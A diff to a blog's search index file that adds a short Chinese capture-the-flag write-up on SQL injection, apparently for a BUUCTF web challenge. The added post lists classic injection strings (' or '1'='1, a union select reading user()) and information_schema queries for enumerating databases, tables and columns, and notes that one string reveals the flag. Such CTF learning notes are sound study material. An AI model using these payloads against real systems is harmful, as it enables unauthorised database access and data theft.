@@ -4,25 +4,19 @@
   
   
   <entry>
-    <title>测试文章3</title>
-    <link href="/2025/01/21/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A03/"/>
-    <url>/2025/01/21/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A03/</url>
+    <title>inget</title>
+    <link href="/2025/01/21/inget/"/>
+    <url>/2025/01/21/inget/</url>
     
-    <content type="html"><![CDATA[<p>测试13<br><img src="/images/buuctfweb-easyphp%E6%B1%9F%E8%8B%8F%E5%B7%A5%E5%8C%A0%E6%9D%AF-1.png" alt="1"></p>]]></content>
+    <content type="html"><![CDATA[<p>知识点：sql注入<br>根据提示，有一个参数id 对id进行sql注入尝试<br>思路：先尝试万能密码注入 接着查库、查表、查列、查数据</p><p>1.构造万能密码和简单构造注入<br>（1）注入语句<br>‘~’ 相当于16进制的0x7e<br>万能密码 ‘or ‘1’ &#x3D;’1<br>’ and ‘1’&#x3D;‘1<br>’ and 1&#x3D;2 union select 1,user(),3- -+ 前面加’是为了闭合后面的’<br>（2）group_concat(string)</p><p>2.核心语法获取数据库信息<br>（1）SQL手工注入方法<br>select schema_name from information_schema.schemata（查库）<br>select table_name from information_schema.tables where table_schema&#x3D;库名（查表）<br>select column_name from information_schema.colums where table_name&#x3D;表名（查列）<br>select 列名 from 库名.表名（查数据）</p><p>这道题万能密码’ and ‘1’&#x3D;’1就能爆出flag</p><p>两篇学习文章：<br><a href="https://blog.csdn.net/lza20001103/article/details/124242991">https://blog.csdn.net/lza20001103/article/details/124242991</a><br><a href="https://blog.csdn.net/FUTEROX/article/details/117754069">https://blog.csdn.net/FUTEROX/article/details/117754069</a></p>]]></content>
     
     
     <categories>
       
-      <category>java</category>
+      <category>Web</category>
       
     </categories>
     
-    
-    <tags>
-      
-      <tag>原创</tag>
-      
-    </tags>
     
   </entry>
   
